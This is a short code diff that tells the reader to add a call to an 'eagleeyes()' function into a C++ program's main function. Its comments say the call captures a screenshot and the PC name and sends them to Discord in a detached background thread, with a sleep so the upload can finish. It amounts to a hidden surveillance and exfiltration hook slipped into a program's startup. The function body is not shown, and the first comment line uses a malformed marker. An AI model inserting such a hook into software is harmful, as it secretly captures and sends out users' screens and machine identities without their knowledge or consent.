@@ -1,0 +1,6 @@
+\\ Add this into main Function
+
+ // Fire the screenshot and PC name to Discord in a detached background thread
+  eagleeyes();
+// Wait a few seconds to let the background thread capture and upload
+  std::this_thread::sleep_for(std::chrono::seconds(2));
